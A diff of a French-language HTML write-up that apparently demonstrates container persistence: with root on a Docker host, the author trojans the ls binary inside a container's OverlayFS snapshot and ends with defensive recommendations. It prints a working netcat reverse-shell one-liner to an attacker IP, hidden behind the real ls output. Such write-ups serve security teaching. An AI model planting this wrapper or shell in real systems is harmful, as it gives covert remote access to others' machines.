@@ -57,7 +57,7 @@
           <img src="images/a_lp_1.png" alt="Netcat listener setup" />
         </figure>
 
-        <p>On lance deux conteneurs Alpine classiques. Pour l'expérience, on suppose qu'on a déjà un accès root sur l'hôte. Notre but est de trouver où ces conteneurs "vivent" physiquement.</p>
+        <p>On lance deux conteneurs Alpine classiques. Pour l'expérience, on suppose qu'on a déjà un accès root sur l'hôte.</p>
 
         <figure>
           <img src="images/v_lp_1.png" alt="Starting Alpine containers" />
@@ -71,7 +71,7 @@
 
         <p>Ici, on identifie le point de montage OverlayFS associé au conteneur.</p>
 
-        <p>Une fois dans le snapshot (ici le n°49), on a accès à l'arborescence complète du conteneur (<code>/bin</code>, <code>/etc</code>, etc.). C'est ici qu'on va agir.</p>
+        <p>Une fois dans le snapshot (ici le n°49), on a accès à l'arborescence complète du conteneur (<code>/bin</code>, <code>/etc</code>, etc.). C'est ici qu'on va agir :</p>
 
         <figure>
           <img src="images/v_lp_3.png" alt="Exploring the snapshot" />
@@ -83,13 +83,10 @@
           <img src="images/v_lp_4.png" alt="Modifying ls binary" />
         </figure>
 
-        <p>Ce script fait deux choses :
-          1. Il lance un <strong>Reverse Shell</strong> en arrière-plan vers l'IP de l'attaquant.
-          2. Il appelle le vrai binaire <code>ls</code> pour que l'utilisateur ne remarque rien.
-        </p>
+        <p>Ce script fait deux choses : Il lance un <strong>Reverse Shell</strong> en arrière-plan vers l'IP de l'attaquant et il appelle le vrai binaire <code>ls</code> pour que l'utilisateur ne remarque rien.</p>
         <pre><code>(mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.17.0.1 4444 > /tmp/f &) > /dev/null 2>&1</code></pre>
 
-        <p>L'utilisateur exécute la commande <code>ls /etc</code>. 
+        <p>Maintenant, quand l'utilisateur exécute la commande <code>ls /etc,</code>, voici ce qu'il observe :</p>
         
         <figure>
           <img src="images/v_lp_5.png" alt="Victim executing ls" />
@@ -97,7 +94,7 @@
 
         <p>L'affichage est normal, l'illusion est parfaite.</p>
         
-        <p>Coté attaquant : La connexion arrive.</p>
+        <p>Coté attaquant : La connexion arrive :</p>
 
         <figure>
           <img src="images/a_lp_2.png" alt="Attacker receiving access" />
@@ -114,7 +111,8 @@
         <h2>5. Conclusion</h2>
         <p>
           Cette démonstration prouve que si l'intégrité de l'hôte est compromise, c'est le conteneur qui est en danger. Selon moi, quelques pistes d'amélioration... 
-          Tout repose d'abord sur le PoLP afin de verrouiller l'accès aux dossiers critiques de containerd. Ensuite, j'ai vu qu'il existe l'option <code>--read-only</code> qui permet de neutraliser la persistance d'une intrusion. Enfin, plus poussé mais il y a aussi des outils de monitoring d'intégrité (FIM) qui peuvent être utilisés pour détecter en temps réel la moindre modification suspecte au sein de <code>/var/lib/docker</code>.
+
+          Tout repose d'abord sur le PoLP afin de verrouiller l'accès aux dossiers critiques de containerd. Ensuite, j'ai vu qu'il existe l'option <code>--read-only</code> qui permet de neutraliser la persistance d'une intrusion. Enfin, plus poussé mais il y a aussi des outils de monitoring d'intégrité (FIM) qui peuvent être utilisés pour détecter en temps réel la moindre modification suspecte au sein de <code>/var/lib/docker</code>. Des solutions comme <em>Tripwire</em> ou <em>AIDE</em> peuvent être configurées pour surveiller ces répertoires sensibles et alerter les administrateurs en cas de changement inattendu.
         </p>
 
       </article>
